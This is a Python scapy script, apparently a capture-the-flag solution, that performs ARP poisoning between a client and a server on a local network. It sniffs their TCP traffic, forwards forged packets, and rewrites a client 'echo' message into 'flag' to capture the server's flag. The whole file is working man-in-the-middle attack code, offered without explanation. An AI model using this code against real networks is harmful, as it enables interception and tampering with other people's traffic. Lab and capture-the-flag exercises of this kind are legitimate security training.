#!/usr/bin/python3

from scapy.all import *
import threading
import time
import os

client_ip = '10.0.0.2'
server_ip = '10.0.0.3'
my_ip = '10.0.0.1'


client_mac =  getmacbyip(client_ip)
server_mac = getmacbyip(server_ip)
my_mac = get_if_hwaddr('eth0')

print(f"{client_mac=}\n{server_mac=}\n{my_mac=}")

def arp_poison():
    poison1 =Ether(dst=client_mac)/ ARP(op=2,pdst="10.0.0.2",hwdst=client_mac,psrc="10.0.0.3",hwsrc=my_mac)
    sendp(poison1,iface="eth0",verbose=0)
    poison2 = Ether(dst=server_mac)/ARP(op=2,pdst="10.0.0.3",hwdst=server_mac,psrc="10.0.0.2",hwsrc=my_mac)
    sendp(poison2,iface="eth0",verbose=0)
def start():
    while True:
        arp_poison()
        time.sleep(1)

threading.Thread(target=start).start()
print("Poisoned Sucessfully")

def handle_packet(pkt):
    if IP in pkt and TCP in pkt:
        print(pkt.summary())
        print('TCP payload: ',bytes(pkt[TCP].payload))
        print(pkt[Ether].src,pkt[Ether].dst)
        if Raw in pkt and pkt[Raw].load[0] == ord('p'):
            print('Your flag: \033[32;5;80m',pkt[Raw].load.decode())
            os._exit(0)
        elif pkt[IP].src==client_ip:
            if Raw in pkt and pkt[Raw].load == b'echo':
                forge = pkt.copy()
                forge[Ether].src=my_mac
                forge[Ether].dst=server_mac
                forge[Raw].load=b'flag'
                del forge[IP].len
                del forge[IP].chksum
                del forge[TCP].chksum
                sendp(forge,iface='eth0',verbose=0)
            else:
                forge = pkt.copy()
                forge[Ether].src=my_mac
                forge[Ether].dst=server_mac
                del forge[IP].len
                del forge[IP].chksum
                del forge[TCP].chksum
                sendp(forge,iface='eth0',verbose=0)
        elif pkt[IP].src == server_ip:
            
            forge = pkt.copy()
            forge[Ether].src=my_mac
            forge[Ether].dst=client_mac
            del forge[IP].len
            del forge[IP].chksum
            del forge[TCP].chksum
            sendp(forge,iface='eth0',verbose=0)
sniff(iface="eth0",prn=handle_packet,store=False)
